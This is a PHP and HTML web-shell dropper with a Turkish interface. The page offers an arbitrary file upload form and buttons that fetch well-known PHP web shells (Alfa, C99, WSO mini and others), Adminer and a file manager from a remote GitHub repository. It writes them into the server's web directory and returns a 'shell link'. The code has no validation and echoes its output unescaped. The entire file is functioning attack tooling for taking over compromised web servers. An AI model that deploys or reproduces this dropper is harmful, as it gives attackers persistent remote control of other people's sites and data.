<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #ffa500;
            margin: 0;
            padding: 0;
        }
        .upload-form {
            background-color: #1c1c1c;
            width: 400px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #ffa500;
            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
        }
        .upload-form h2 {
            text-align: center;
            color: #ffa500;
            text-shadow: 0 0 5px #ffa500;
        }
        .upload-form p {
            color: #ffa500;
            text-shadow: 0 0 3px #ffa500;
        }
        .upload-form input[type="file"] {
            margin-bottom: 10px;
            background-color: #000;
            border: 1px solid #ffa500;
            color: #ffa500;
            padding: 5px;
            border-radius: 5px;
            width: 100%;
        }
        .upload-form input[type="submit"] {
            background-color: #ffa500;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .upload-form input[type="submit"]:hover {
            background-color: #ffcc66;
        }
        .message {
            text-align: center;
            margin-top: 20px;
            color: #ffa500;
            text-shadow: 0 0 5px #ffa500;
        }
        .message a {
            color: #00f;
            text-decoration: none;
        }
        .message a:hover {
            text-decoration: underline;
        }
        .hack-buttons {
            text-align: center;
            margin-top: 20px;
        }
        .hack-button {
            background-color: #ffa500;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            width: calc(100% - 10px);
        }
        .hack-button:hover {
            background-color: #ffcc66;
        }
        body {
            position: relative;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: #000;
        }
    </style>
</head>
<body>
    <div class="upload-form">
        <h2>Yükleme Formu</h2>
        <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <p>Bir dosya seç ve avla :)</p>
            <input type="file" name="uploaded_file" placeholder="Hedef dosya seç...">
            <input type="submit" value="Yükle">
        </form>
        <div class="message">
            PatroeN
        </div>
        <div class="upload-message"></div>
        <div class="hack-buttons">
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/3.php')">C99 Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/4.php')">WsoMini Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/5.php')">k2ll33d Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/6.php')">spademini Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/7.php')">Crackmeci Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/phpinfo.php')">phpinfo Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/adminer.php')">Adminer Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/phpfm.php')">phpFM Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/upload.php')">upload Yükle</button>
			<button class="hack-button" onclick="uploadFile('https://github.com/PatroenDev/Shell/raw/main/upload2.php')">upload2 Yükle</button>
        </div>
    </div>
    
    <script>
        function uploadFile(url) {
            // Get the form element
            var form = document.querySelector('.upload');

            // Append a hidden input field with the URL value
            var urlInput = document.createElement('input');
            urlInput.type = 'hidden';
            urlInput.name = 'url';
            urlInput.value = url;
            form.appendChild(urlInput);

            // Submit the form
            form.submit();
        }
    </script>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $message = "";
        if (isset($_POST["url"])) {
            $url = $_POST["url"];
            $fileContent = file_get_contents($url);
            if ($fileContent !== false) {
                $fileName = basename($url);
                $uploadDirectory = "";
                if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
                    $message = "Dosya başarıyla yüklendi. Shell linki: <a href='$uploadDirectory$fileName' target='_blank'>$uploadDirectory$fileName</a>";
                } else {
                    $message = "Dosya yüklenirken bir hata oluştu!";
                }
            } else {
                $message = "Dosya indirilirken bir hata oluştu!";
            }
        } else {
            if (!empty($_FILES['uploaded_file'])) {
                $uploadKlasoru = "";
                $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
                if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
                    $message = "Dosya " . basename($_FILES['uploaded_file']['name']) . " başarıyla hacklendi. <a href='$dosyaYolu' target='_blank'>Dosyayı Aç</a>";
                } else {
                    $message = "Dosya yüklenirken bir hata oluştu!";
                }
            }
        }
        echo "<script>document.querySelector('.upload-message').innerHTML = \"$message\";</script>";
    }
    ?>
</body>
</html>
